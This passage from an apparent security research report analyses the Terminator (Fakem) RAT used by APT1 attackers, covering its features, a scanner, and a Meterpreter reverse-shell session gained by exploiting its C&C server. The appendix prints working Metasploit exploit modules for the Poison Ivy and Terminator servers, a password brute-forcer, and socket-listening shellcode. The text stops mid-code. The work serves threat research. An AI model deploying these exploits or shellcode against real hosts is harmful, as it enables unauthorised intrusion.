Example of network target diagram\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 17 f 48\n\n\n-----\n\n# 5 Terminator RAT (aka Fakem RAT)\n\n### 5.1 Description\n\nOn one of the proxy server, we identified a binary called Terminator3.6.exe. After a quick analysis\nwe noticed that this binary is the server side of a homemade Remote Administration Tool (RAT).\nAfter analysis, we identified that this sample corresponds to Fakem RAT discovered by Trendmicro\nin January 2013. Additional information can be found there: http://www.trendmicro.com/cloudcontent/us/pdfs/security-intelligence/white-papers/wp-fakem-rat.pdf.\n\nWe were lucky enough to find the client side (the malware) on the same server. These two binaries\nallowed us to test the product and see how it works.\n\n### 5.2 Password protection\n\nWhen the server is starting, a password is asked:\n\nFigure 7: Terminator password\n\nWe decided to crack this password. A CRC is generated based on the supplied password. Here is\nthe algorithm of this CRC:\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 18 f 48\n\n\n-----\n\nFigure 8: Terminator CRC algorithm\n\nAfter this operation, a xor, then a compare operation is done:\n\nFigure 9: Terminator xor and compare operation on the password\n\nTo obtain the password, we developed a brute forcer; the code source is available in the appendix.\n\nThe first argument is the maximum number or characters and the second is the value used in the\ncomparison (available in the ASM code).\n```\nrootbsd@alien:~/terminator$ ./bf 10 0xdafd58f3\nDEBUG:Ap@hX dafd58f3 dafd58f3\n\n```\nIn this case the password to start the server is “Ap@hX”.\n\n### 5.3 Features and usage\n\nThe malware’s way to operate is simple and efficient since it does not embed any specific feature.\nThe malware waits for a library (DLL) sent from the command and control. The attackers then\nchoose a specific feature, and send the associated DLL file to the infected machine. The libraries\nare stored in the server’s executable file as resources. The resources are not encrypted but the\nlibraries headers are removed.\n\nThe communication scheme is really weird, the infected machine (the client) sent HTML to the\nC&C. The communication starts with:\n\n```\n<html><title>12356</title><body>\n\n```\n\nThis string can be identified in the memory of the process. The pattern of the connection is:\n```\nstage = \"<html><title>12356</title><body>\"\nstage += \"\\xa0\\xf4\\xf6\\xf6\"\nstage += \"\\xf6\" * (0x400 - len(stage))\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 19 f 48\n\n\n-----\n\nHere is the main RAT’s GUI :\n\nFigure 10: Terminator: starting interface\n\nWe can choose between three different protocols:\n\nFigure 11: Terminator: Protocol and port choice\n\nWhen a machine is infected, it appears on the GUI:\n\nFigure 12: Terminator: List of infected machines\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 20 f 48\n\n\n-----\n\nBelow is the interface that is shown once a machine has been selected:\n\nFigure 13: Terminator: List of features\n\nOn the screenshot we can see the 10 available features. Each one of the features matches a DLL\nfile. To upload a DLL to the infected machine (and enable its feature), we have to tick the feature’s\ncheckbox and then click on “Upload Plug”. For example, if we choose “Shell Plug-ins”, the button\n“Shell” (on the left pane) becomes enabled. Here is the list of available features:\n\n   - File management;\n\n   - Process management;\n\n   - Shell access;\n\n   - Screenshot;\n\n   - Registry management;\n\n   - Services management;\n\n   - Get information of the infected machine;\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 21 f 48\n\n\n-----\n\n   - Keylogger;\n\n   - Dump password hashes in memory;\n\n   - View user’s files.\n\nHere are some screenshots of the administration interface:\n\nFigure 14: Terminator: List of processes on the infected machine\n\nFigure 15: Terminator: List of opened ports on the infected machine\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 22 f 48\n\n\n-----\n\nFigure 16: Terminator: Remote shell on the infected machine\n\nFigure 17: Terminator: Registry access to the infected machine\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 23 f 48\n\n\n-----\n\nFigure 18: Terminator: Services management on the infected machine\n\nFigure 19: Terminator: Information about the infected machine\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 24 f 48\n\n\n-----\n\nFigure 20: Terminator: Installed software on the infected machine\n\n### 5.4 Scanner\n\nWe decided to create a scanner to identify the servers which were running Terminator. Here is the\ncode to identify the service:\n```\ndef check_terminator(self, host, port, res):\n  try:\n    af, socktype, proto, canonname, sa = res\n    s = socket.socket(af, socktype, proto)\n    s.settimeout(6)\n    s.connect(sa)\n    stage = \"<html><title>12356</title><body>\"\n    stage += \"\\xa0\\xf4\\xf6\\xf6\"\n    stage += \"\\xf6\" * (0x400 - len(stage))\n    s.sendall(stage)\n    data = s.recv(0x400)\n    if len(data) < 0x400:\n      return\n    if data.find(\"<html><title>12356</title><body>\") == -1:\n      return\n    print \"%s Terminator %s %s:%d\" % (datetime.datetime.now(), host,\n                     sa[0], sa[1])\n\n```\nWith this script, we identified more C&C servers managed by the attackers, which allowed us to\nrefine our scheme of the attacker’s infrastructure.\n\n### 5.5 Remote code execution vulnerability\n\nAfter a full analysis of the communication protocol, we identified a vulnerability in the Command &\nControl executable: The server does not correctly parse the data sent by the infected machine. We\ncreated an exploit to remotely take control of the command & control. The code source of the\nMetasploit exploit is available in the appendix.The exploitation provided the following result.\n\n```\nmsf > use exploit/windows/misc/terminator_judgment_day\n\n```\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 25 f 48\n\n\n-----\n\n```\nmsf exploit(terminator_judgment_day) > show options\nModule options (exploit/windows/misc/terminator_judgment_day):\n  Name  Current Setting Required Description\n  ----  --------------- -------- ----------  RHOST          yes    The target address\n  RPORT 80        yes    The target port\nExploit target:\n  Id Name\n  -- ---  0  Terminator 3.7 / Windows XP SP3\nmsf exploit(terminator_judgment_day) > set rhost 192.168.0.45\nrhost => 192.168.0.45\nmsf exploit(terminator_judgment_day) > set payload meterpreter/revers[…]\npayload => windows/meterpreter/reverse_https\nmsf exploit(terminator_judgment_day) > set lhost 192.168.0.24\nlhost => 192.168.0.24\nmsf exploit(terminator_judgment_day) > exploit\n[*] Started HTTPS reverse handler on https://192.168.0.24:8443/\n[*] Connection...\n[*] 1024 - 653\n[*] Send exploit...\n[*] 192.168.0.45:1050 Request received for /q1fT...\n[*] 192.168.0.45:1050 Staging connection for target /q1fT received...\n[*] Patched user-agent at offset 641512...\n[*] Patched transport at offset 641172...\n[*] Patched URL at offset 641240...\n[*] Patched Expiration Timeout at offset 641772...\n[*] Patched Communication Timeout at offset 641776...\n[*] Meterpreter session 1 opened (192.168.0.24:8443 -> 192.168.0.45:1050)\nat 2013-03-13 10:04:38 +0100\nmeterpreter >\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 26 f 48\n\n\n-----\n\n# 6 Conclusion\n\nIn this report, we document how we could reveal the methodology and tools used by an attacker.\nThe used technologies were commonly known, which supports our fears that such kind of APT\naffects more and more infrastructures. Among them we can find public companies, governmental\nand political institutions… The most efficient and proactive way to protect an infrastructure and\nfight back the attackers is to understand their attacks and the way they work. An interesting fact is\nto see the professionalization in this field. Here are some key facts about the attackers:\n\n   - More than 300 servers\n\n   - Use of proxy servers to hide their activities;\n\n   - one server per target;\n\n   - custom made malware\n\n   - working hours, such as office employees\n\n   - really good organization\n\n   - …\n\nInfrastructures such as the one detailed in this report are expensive but Intelligence is a real issue.\nPeople or organisations seem do not hesitate to pay for such illegal information theft.\n\n### “The only real defense is offensive defense” (Mao Zedong)\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 27 f 48\n\n\n-----\n\n# Appendix\n\n### Poison Ivy exploit\n```\n##\n# This file is part of the Metasploit Framework and may be subject to\n# redistribution and commercial restrictions. Please see the Metasploit\n# web site for more information on licensing and terms of use.\n#  http://metasploit.com/\n##\nrequire 'msf/core'\nrequire 'camellia'\nclass Metasploit3 < Msf::Exploit::Remote\n    Rank = NormalRanking\n    include Msf::Exploit::Remote::Tcp\n    include Msf::Exploit::Brute\n    def initialize(info = {})\n       super(update_info(info,\n           'Name' => \"Poison Ivy 2.3.2 C&C Server Buffer Overflow\",\n           'Description'  => %q{\n        blabla\n           },\n           'License'    => MSF_LICENSE,\n           'Author'     =>\n              [\n                  'Hugo Caron', # Malware.lu\n              ],\n           'DisclosureDate' => \"Apr 2013\",\n           'DefaultOptions' =>\n              {\n                  'EXITFUNC' => 'thread',\n              },\n           'Payload'    =>\n              {\n                  'StackAdjustment'  => -4000,\n                  'Space'       => 10000,\n                  'BadChars'     => \"\",\n              },\n           'Platform'    => 'win',\n           'Targets'    =>\n              [\n                  [\n                     'Poison Ivy 2.3.2',\n                     {\n                         'Ret' => 0x0041AA97, \n                         'RWAddress' => 0x00401000,\n                         'Offset' => 0x806D,\n                         'PayloadOffset' => 0x75,\n                         'jmpPayload'=> \n                     \"\\x81\\xec\\x00\\x80\\x00\\x00\\xff\\xe4\"\n                     }\n                  ],\n                  [\n                     'Poison Ivy 2.3.2 - Bruteforce',\n                     {\n                         'Ret' => 0x0041AA97,\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 28 f 48\n\n\n-----\n\n```\n                         'RWAddress' => 0x00401000,\n                         'Offset' => 0x806D,\n                         'PayloadOffset' => 0x75,\n                         'jmpPayload' => \n                     \"\\x81\\xec\\x00\\x80\\x00\\x00\\xff\\xe4\",\n                         'Bruteforce' =>\n                            {\n                                'Start' => { 'Try' => 1 },\n                                'Stop' => { 'Try' => 100 },\n                                'Step' => 1,\n                                'Delay' => 0\n                            }\n                     }\n                  ]\n              ],\n           'DefaultTarget' => 0\n       ))\n       register_options(\n           [\n              Opt::RPORT(3460),\n              OptBool.new('RANDHEADER', [true, 'Send random bytes as \n                            the header', false]), \n              OptString.new('Password', [true, \"Client password\", \n                          \"admin\" ]),\n           ], self.class)\n       register_advanced_options(\n           [\n              OptInt.new('BruteWait', [ false, \"Delay between brute\n                            force attempts\", 2 ])\n           ], self.class)\n    end\n def pad(data, pad_len)\n   data_len = data.length\n   return data + \"\\x00\"*(pad_len-data_len)\n end\n    def check\n  c = Camellia.new(pad(datastore['Password'], 32))\n  sig = c.encrypt(\"\\x00\"*16)\n       lensig = [0x000015D0].pack(\"V\")\n       connect\n       sock.put(\"\\x00\" * 256)\n       response = sock.read(256)\n       datalen = sock.read(4)\n       disconnect\n       if datalen == lensig\n           if response[0, 16] == sig\n              print_status(\"Password: \\\"#{datastore['Password']}\\\"\")\n           else\n              print_status(\"Unknown password.\")\n           end\n           return Exploit::CheckCode::Vulnerable\n       end\n       return Exploit::CheckCode::Safe\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 29 f 48\n\n\n-----\n\n```\n    end\n    def single_exploit\n       if datastore['RANDHEADER'] == true\n           header = rand_text(0x20)\n       else\n           c = Camellia.new(pad(datastore['Password'], 32))\n           header =  c.encrypt(\"\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\n                    \\x00\\x00\\x01\\x00\\xbb\\x00\\x00\\x00\")\n           header += c.encrypt(\"\\xc2\\x00\\x00\\x00\\xc2\\x00\\x00\\x00\n                    \\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\")\n       end\n       do_exploit(header)\n    end\n    def brute_exploit(brute_target)\n       if brute_target['Try'] == 1\n           print_status(\"Bruteforcing - Try #{brute_target['Try']}:\n                Header for 'admin' password\")\n           header = \"\\xe7\\x77\\x44\\x30\\x9a\\xe8\\x4b\\x79\\xa6\\x3f\n              \\x11\\xcd\\x58\\xab\\x0c\\xdf\\x2a\\xcc\\xea\\x77          \n              \\x6f\\x8c\\x27\\x50\\xda\\x30\\x76\\x00\\x5d\\x15\n              \\xde\\xb7\"\n       else\n           print_status(\"Bruteforcing \")\n           header = rand_text(0x20)\n       end\n       do_exploit(header)\n    end\n    def do_exploit(header)\n       # Handshake\n       connect\n       print_status(\"Performing handshake...\")\n       sock.put(\"\\x00\" * 256)\n       sock.get\n       # Don't change the nulls, or it might not work\n       xploit = ''\n       xploit << header\n       xploit << \"\\x00\" * (target['PayloadOffset'] - xploit.length)\n       xploit << payload.encoded\n       xploit << \"\\x00\" * (target['Offset'] - xploit.length)\n       xploit << [target.ret].pack(\"V\") \n       xploit << [target['RWAddress']].pack(\"V\") \n       xploit << target['jmpPayload']\n       # The disconnection triggers the exploit\n       print_status(\"Sending exploit...\")\n       sock.put(xploit)\n       select(nil,nil,nil,5)\n       disconnect\n    end\nend\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 30 f 48\n\n\n-----\n\n### Camellia plugin for John the Ripper\n```\n/* Standard includes */\n#include <string.h>\n#include <assert.h>\n#include <errno.h>\n/* John includes */\n#include \"arch.h\"\n#include \"misc.h\"\n#include \"common.h\"\n#include \"formats.h\"\n#include \"params.h\"\n#include \"options.h\"\n#include \"base64.h\"\n/* If openmp */\n#ifdef _OPENMP\n#include <omp.h>\n#define OMP_SCALE 32\n#endif\n/* crypto includes */\n#include <openssl/camellia.h>\n#define FORMAT_LABEL      \"camellia\"\n#define FORMAT_NAME       \"Camellia bruteforce\"\n#define ALGORITHM_NAME     \"32/\" ARCH_BITS_STR\n#define BENCHMARK_COMMENT    \"\"\n#define BENCHMARK_LENGTH    -1\n#define PLAINTEXT_LENGTH    32 \n#define BINARY_SIZE       16\n#define SALT_SIZE        0\n#define MIN_KEYS_PER_CRYPT   1\n#define MAX_KEYS_PER_CRYPT   1\nstatic struct fmt_tests cam_tests[] = {\n    {\"$camellia$NeEGbM0Vhz7u+FGJZrcPiw==\", \"admin\" },\n    {NULL}\n};\nstatic char (*saved_key)[PLAINTEXT_LENGTH + 1];\nstatic char (*crypt_out)[BINARY_SIZE];\nstatic void init(struct fmt_main *self)\n{\n#if defined (_OPENMP)\n    int omp_t;\n    omp_t = omp_get_max_threads();\n    self->params.min_keys_per_crypt *= omp_t;\n    omp_t *= OMP_SCALE;\n    self->params.max_keys_per_crypt *= omp_t;\n#endif\n    saved_key = mem_calloc_tiny(sizeof(*saved_key) *\n          self->params.max_keys_per_crypt, MEM_ALIGN_NONE);\n       crypt_out = mem_calloc_tiny(sizeof(*crypt_out) * \n              self->params.max_keys_per_crypt, MEM_ALIGN_NONE);\n}\nstatic int valid(char *ciphertext, struct fmt_main *self)\n{\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 31 f 48\n\n\n-----\n\n```\n    return !strncmp(ciphertext, \"$camellia$\", 10); //magic secret number\n}\nstatic void *get_binary(char *ciphertext)\n{    static union {\n        unsigned char c[BINARY_SIZE+1];\n        ARCH_WORD dummy;\n    } buf;\n    unsigned char *out = buf.c;\n    char *p;\n    p = strrchr(ciphertext, '$') + 1;\n    base64_decode(p, strlen(p), (char*)out);\n    return out;\n}\nstatic void crypt_all(int count)\n{\n    int index = 0;\n#ifdef _OPENMP\n#pragma omp parallel for\n    for (index = 0; index < count; index++)\n#endif\n    {\n       CAMELLIA_KEY st_key;\n      unsigned char in[16] = {0};\n      unsigned char key[32] = {0};\n       memcpy(key, saved_key[index], strlen(saved_key[index]));\n       Camellia_set_key(key, 256, &st_key);\n       Camellia_encrypt(in, crypt_out[index], &st_key);\n    }\n}\nstatic int cmp_all(void *binary, int count)\n{\n    int index = 0;\n#ifdef _OPENMP\n    for (; index < count; index++)\n#endif\n    if (!memcmp(binary, crypt_out[index], BINARY_SIZE))\n      return 1;\n    return 0;\n}\nstatic int cmp_one(void *binary, int index)\n{\n    return !memcmp(binary, crypt_out[index], BINARY_SIZE);\n}\nstatic int cmp_exact(char *source, int index)\n{\n    return 1;\n}\nstatic void cam_set_key(char *key, int index)\n{\n    int saved_key_length = strlen(key);\n    if (saved_key_length > PLAINTEXT_LENGTH)\n        saved_key_length = PLAINTEXT_LENGTH;\n    memcpy(saved_key[index], key, saved_key_length);\n    saved_key[index][saved_key_length] = 0;\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 32 f 48\n\n\n-----\n\n```\n}\nstatic char *get_key(int index)\n{\n    return saved_key[index];\n}\nstruct fmt_main fmt_camellia = {\n    {\n        FORMAT_LABEL,\n        FORMAT_NAME,\n        ALGORITHM_NAME,\n        BENCHMARK_COMMENT,\n        BENCHMARK_LENGTH,\n        PLAINTEXT_LENGTH,\n        BINARY_SIZE,\n#if FMT_MAIN_VERSION > 9\n        DEFAULT_ALIGN,\n#endif\n        SALT_SIZE,\n#if FMT_MAIN_VERSION > 9\n        DEFAULT_ALIGN,\n#endif\n        MIN_KEYS_PER_CRYPT,\n        MAX_KEYS_PER_CRYPT,\n        FMT_CASE | FMT_8_BIT | FMT_OMP,\n        cam_tests\n    }, {\n        init,\n        fmt_default_prepare,\n        valid,\n        fmt_default_split,\n        get_binary,\n        fmt_default_salt,\n#if FMT_MAIN_VERSION > 9\n        fmt_default_source,\n#endif\n        {\n                  fmt_default_binary_hash,\n        },\n        fmt_default_salt_hash,\n        fmt_default_set_salt,\n        cam_set_key,\n        get_key,\n        fmt_default_clear_keys,\n        crypt_all,\n              {\n                  fmt_default_get_hash,\n        },\n        cmp_all,\n        cmp_one,\n        cmp_exact\n    }\n};\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 33 f 48\n\n\n-----\n\n### Terminator (aka Fakem RAT) password brute forcer\n```\n// gcc -o bf bf.c\n// ./bf 10 0xdafd58f3\n#include <stdio.h>\n#include <stdint.h>\n#include <string.h>\n#define ror(i,by)                \\\n __asm__ (                   \\\n      \"ror %b1,%q0\"            \\\n      :\"+g\" (i)              \\\n      :\"Jc\" (by) )\nuint32_t\ncrc32(char* data, int len){\n uint32_t crc = 0;\n int i;\n for (i = 0; i < len; ++i){\n  crc |= data[i];\n  ror (crc, 5);\n }\n return crc ^ 0x007A7871;\n}\nchar MIN = '0', MAX = 'z';\nint\nnext (char* s, int len){\n int i;\n for (i = 0; i < len; ++i){\n  if (s[i] != MAX){\n   ++s[i];\n   return i;\n  }\n  s[i] = MIN;\n }\n return i;\n}\nint\nmain(int argc, char** argv){\n int len;\n sscanf(argv[1], \"%u\", &len);\n uint32_t crc;\n sscanf(argv[2], \"%x\", &crc);\n int i;\n for (i = 1; i < len; ++i){\n  char key[i + 1];\n  memset (key, MIN, i);\n  key[i] = 0;\n  int current = i - 1;\n  while (next(key, i) != i){\n   uint32_t _crc = crc32(key, i);\n   if (crc == _crc){\n    printf(\"DEBUG:%s %x %x\\n\", key, crc, _crc);\n      return;\n   }\n  }\n }\n}\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 34 f 48\n\n\n-----\n\n### Terminator (aka Fakem RAT) exploit\n```\nrequire 'msf/core'\nclass Metasploit3 < Msf::Exploit::Remote\n    Rank = NormalRanking\n    include Msf::Exploit::Remote::Tcp\n    def initialize(info = {})\n       super(update_info(info,\n           'Name'      => \"Terminator 3.7, RCE\",\n           'Description'  => %q{\n              This module exploits a stack buffer overflow in \n           Terminator 3.7 C&C server.\n           },\n           'License'    => MSF_LICENSE,\n           'Author'     =>\n              [\n                  'Hugo Caron',\n              ],\n           'References'   =>\n              [\n                  [ 'URL', 'http://www.malware.lu/' ]\n              ],\n           'DisclosureDate' => \"Mar XX 2013\",\n           'DefaultOptions' =>\n              {\n                  'EXITFUNC' => 'thread',\n              },\n           'Payload'    =>\n              {\n                  'StackAdjustment'  => -4000,\n                  'Space'       => 512,\n                  'BadChars'     => \"\",\n              },\n           'Platform'    => 'win',\n           'Targets'    =>\n              [\n                  [\n                     'Terminator 3.7 / Windows XP SP3',\n                     {\n                         'Ret' => 0x0041AA97,\n                         'RWAddress' => 0x00401000,\n                         'Offset' => 0x806D,\n                         'PayloadOffset' => 0x75,\n                         'jmpPayload' => \n                   \"\\x81\\xec\\x00\\x80\\x00\\x00\\xff\\xe4\"\n                     }\n                  ]\n              ],\n           'DefaultTarget' => 0\n       ))\n       register_options(\n           [\n              Opt::RPORT(80),\n           ], self.class)\n       register_advanced_options(\n           [\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 35 f 48\n\n\n-----\n\n```\n           ], self.class)\n    end\n    def check\n       return Exploit::CheckCode::Vulnerable\n       #return Exploit::CheckCode::Safe\n    end\n    def ror(byte, count)\n       while count > 0 do\n           byte = (byte >> 1 | byte << 7) & 0xFF\n           count -= 1\n       end\n       return byte\n    end\n    def encode(data)\n       key = \"ARCHY\".reverse\n       out = \"\"\n       data.each_byte do |c|\n           key.each_byte do |k|\n              c ^= k\n              c = ror(c, 3)\n           end\n           out << c\n       end\n       return out\n    end\n    def exploit()\n       # Handshake\n       connect\n       print_status(\"Connection...\")\n       # ROP const\n       sc_jmp_back = \"\\xe9\\x20\\xfc\\xff\\xff\" # -992\n       push_esp = [0x040675e].pack('V')\n       # Build ROP\n       rop = ''\n       rop << push_esp\n       rop << \"A\" * 4\n       rop << sc_jmp_back\n       # Build block to send\n       block_size = 0x400\n       offset_block = 128\n       block = ''\n       block << \"A\" * offset_block\n       block << rop\n       block << payload.encoded\n       print_status(\"#{block_size} - #{block.length}\")\n       block << \"B\" * (block_size - block.length)\n       block = encode(block)\n       content_len = 0xc68\n      header = \"POST /foo HTTP/1.0\\r\\nContent-Length:\n          #{content_len}\\r\\n\\r\\n\"\n       xploit = ''\n       xploit << header\n       xploit << block\n       print_status(\"Send exploit...\")\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 36 f 48\n\n\n-----\n\n```\n       sock.put(xploit)\n       select(nil,nil,nil,5)\n       disconnect\n    end\nend\n\n### Shellcode\n\n```\nmain.c:\n```\n#include \"global.h\"\n#include “winutils.h”\n#define htons(n) (((((unsigned short)(n) & 0xFF)) << 8) | (((unsigned short)(n)\n& 0xFF00) >> 8))\nint _main(int argc, char *argv[]){\n    HMODULE kernel32, ws32, msvcrt32, ntdll;\n    WSADATA wsaData;\n    sockaddr_in service;\n    SOCKET sock, sockc;\n    unsigned int len, i, cur_len=0;\n    unsigned short port = htons(80);\n    int iResult;\n    int (*sc)();\n    s_config c;\n    init_config(&c);\n    kernel32 = get_kernel32();\n    c.LoadLibraryA = (sLoadLibraryA)getprocaddrbyhash(kernel32, \n                             dLoadLibraryA);\n    c.VirtualAlloc = (sVirtualAlloc)getprocaddrbyhash(kernel32, \n                            dVirtualAlloc);\n  ws32 = c.LoadLibraryA(c.sws32);\n    c.socket = (ssocket)getprocaddrbyhash(ws32, dsocket);\n    c.closesocket = (sclosesocket)getprocaddrbyhash(ws32, dclosesocket);\n    c.getsockname = (sgetsockname)getprocaddrbyhash(ws32, dgetsockname);\n    c.recv = (srecv)getprocaddrbyhash(ws32, drecv);\n    c.listen = (slisten)getprocaddrbyhash(ws32, dlisten);\n    c.bind = (sbind)getprocaddrbyhash(ws32, dbind);\n    c.accept = (saccept)getprocaddrbyhash(ws32, daccept);\n    //for (i=0; i < 65535; i++){\n    for (i=0; i < 128000; i++){\n       struct sockaddr_in sin;\n       socklen_t len = sizeof(sin);\n       if (c.getsockname(i, (struct sockaddr *)&sin, &len) != -1)\n           if (sin.sin_port != htons(0))\n              if ( sin.sin_addr.s_addr == 0x0){\n                  port = sin.sin_port;\n                  c.closesocket(i);\n              }\n    }\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 37 f 48\n\n\n-----\n\n```\n    sock = c.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n    service.sin_family = AF_INET;\n    service.sin_addr.s_addr = 0;\n    service.sin_port = port;\n    if(c.bind(sock, (SOCKADDR *) & service, sizeof (service)) == \n   SOCKET_ERROR){\n       goto exit;\n    }\n    c.listen(sock, 1);\n    sockc = c.accept(sock, NULL, NULL);\n    c.closesocket(sock);\n    iResult = c.recv(sockc, &len, sizeof(len), 0);\n    if(iResult != sizeof(len)){\n       goto exit;\n    }\n    sc = c.VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    cur_len = 0;\n    do {\n       iResult = c.recv(sockc, sc+cur_len, len-cur_len, 0);\n       if(iResult == 0){\n           break;\n       }else if(iResult < 0){\n           goto exit;\n       }\n       cur_len += iResult;\n    } while(cur_len < len);\n    asm(\"movl %0, %%edi;\" : : \"r\"(sockc) :);\n    sc();\nexit:\n    c.closesocket(sock);\n    return 1;\n}\n\n```\nglobal.h:\n```\n#ifndef __GLOBAL__\n#define __GLOBAL__\n#include \"fct.h\"\ntypedef struct {\n  char sws32[12];\nunsigned int sws32_len;\n  sVirtualAlloc VirtualAlloc;\n  sLoadLibraryA LoadLibraryA;\n  sclosesocket closesocket;\n  sgetsockname getsockname;\n  srecv recv;\n  sWSAStartup WSAStartup;\n  ssocket socket;\n  slisten listen;\n  sbind bind;\n  saccept accept;\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 38 f 48\n\n\n-----\n\n```\n} s_config;\nvoid init_config(s_config *config);\n#endif\n\n```\nfct.h:\n```\n#ifndef __FCT__\n#define __FCT__\n#include <windows.h>\n#define _WIN32_WINNT 0x0501\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#define dLoadLibraryA 0x9322f2db\n#define dMessageBoxA 0x1c4e3f7a\n#define dmalloc 0x0d9d6e2d\n#define dGetProcessHeap 0x15a3e604\n#define dHeapAlloc 0x50aa445e // RtlAllocateHeap\n#define dExpandEnvironmentStringsA 0x85fc3b07\n#define dGetModuleFileNameA 0x9fedfa45\n#define dCopyFileA 0x6a4f8fa9\n#define dSetFileAttributesA 0x1ce726cf\n#define dRegOpenKeyExA 0xc1ab24e2\n#define dRegSetValueExA 0xc0050eca\n#define dRegCloseKey 0xa60bfc30\n#define dWSAStartup 0xab5c89eb\n#define dgetaddrinfoA 0x708fb562\n#define dsocket 0x4ebb8f32\n#define dWSACleanup 0xe25e6cc4\n#define dconnect 0xda57c9f1\n#define dfreeaddrinfo 0xbf712706\n#define drecv 0x97c180f9\n#define dCreateThread 0xc891017d\n#define dclosesocket 0x53d900a4\n#define dWaitForSingleObject 0x2cecf27a\n#define dVirtualFree 0x1d3faf80\n#define dVirtualAlloc 0xc143c5b9\n#define dSleep 0x5b06c2b6\n#define dsend 0x2fe09c83\n#define dgetsockname 0x5adeac8e\n#define dbind 0x480d35a8\n#define daccept 0xd0f420d1\n#define dlisten 0xc8da78c8\ntypedef HMODULE (CALLBACK* sLoadLibraryA)(char *);\ntypedef void *(CALLBACK* smalloc)(size_t size );\ntypedef HANDLE (CALLBACK* sGetProcessHeap)(void);\ntypedef LPVOID (CALLBACK* sHeapAlloc)(\n       HANDLE hHeap,\n       DWORD dwFlags,\n       SIZE_T dwBytes\n);\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 39 f 48\n\n\n-----\n\n```\ntypedef int (CALLBACK* sMessageBoxA)(HWND hWnd, char *lpText, \n    char *lpCaption, UINT uType);\ntypedef DWORD (CALLBACK* sExpandEnvironmentStringsA)(\n       LPCTSTR lpSrc,\n       LPTSTR lpDst,\n       DWORD nSize );\ntypedef DWORD (CALLBACK* sGetModuleFileNameA)(\n       HMODULE hModule,\n       LPTSTR lpFilename,\n       DWORD nSize\n);\ntypedef BOOL (CALLBACK* sCopyFileA)(\n       LPCTSTR lpExistingFileName,\n       LPCTSTR lpNewFileName,\n       BOOL bFailIfExists\n);\ntypedef BOOL (CALLBACK* sSetFileAttributesA)(\n       LPCTSTR lpFileName,\n       DWORD dwFileAttributes\n);\ntypedef LONG (CALLBACK* sRegOpenKeyExA)(\n    HKEY hKey,\n    LPCTSTR lpSubKey,\n    DWORD ulOptions,\n    REGSAM samDesired,\n    PHKEY phkResult\n);\ntypedef LONG (CALLBACK* sRegSetValueExA)(\n    HKEY hKey,\n    LPCTSTR lpValueName,\n    DWORD Reserved,\n    DWORD dwType,\n    const BYTE *lpData,\n    DWORD cbData\n);\ntypedef LONG (CALLBACK* sRegCloseKey)(\n    HKEY hKey\n);\ntypedef int (CALLBACK* sWSAStartup)(\n    WORD wVersionRequested,\n    LPWSADATA lpWSAData\n);\ntypedef int (CALLBACK* sgetaddrinfoA)(\n    PCSTR pNodeName,\n    PCSTR pServiceName,\n    const struct addrinfo *pHints,\n    struct addrinfo **ppResult\n);\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 40 f 48\n\n\n-----\n\n```\ntypedef SOCKET (CALLBACK* ssocket)(\n    int af,\n    int type,\n    int protocol\n);\ntypedef int (CALLBACK* sWSACleanup)(void);\ntypedef int (CALLBACK* sconnect)(\n    SOCKET s,\n    const struct sockaddr *name,\n    int namelen\n);\ntypedef void (CALLBACK* sfreeaddrinfo)(\n    struct addrinfo *ai\n);\ntypedef int (CALLBACK* srecv)(\n    SOCKET s,\n    char *buf,\n    int len,\n    int flags\n);\ntypedef HANDLE (CALLBACK* sCreateThread)(\n    LPSECURITY_ATTRIBUTES lpThreadAttributes,\n    SIZE_T dwStackSize,\n    LPTHREAD_START_ROUTINE lpStartAddress,\n    LPVOID lpParameter,\n    DWORD dwCreationFlags,\n    LPDWORD lpThreadId\n);\ntypedef int __stdcall (CALLBACK* sclosesocket)(\n    SOCKET s\n);\ntypedef DWORD (CALLBACK* sWaitForSingleObject)(\n    HANDLE hHandle,\n    DWORD dwMilliseconds\n);\ntypedef BOOL (CALLBACK* sVirtualFree)(\n    LPVOID lpAddress,\n    SIZE_T dwSize,\n    DWORD dwFreeType\n);\ntypedef LPVOID (CALLBACK* sVirtualAlloc)(\n    LPVOID lpAddress,\n    SIZE_T dwSize,\n    DWORD flAllocationType,\n    DWORD flProtect\n);\ntypedef VOID (CALLBACK* sSleep)(\n    DWORD dwMilliseconds\n);\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 41 f 48\n\n\n-----\n\n```\ntypedef int (CALLBACK* ssend)(\n    SOCKET s,\n    const char *buf,\n    int len,\n    int flags\n);\ntypedef int __stdcall (CALLBACK* sgetsockname)(\n    SOCKET s,\n    struct sockaddr *name,\n    int *namelen\n);\ntypedef int (CALLBACK* slisten)(\n SOCKET s,\n int backlog\n);\ntypedef SOCKET (CALLBACK *saccept)(\n 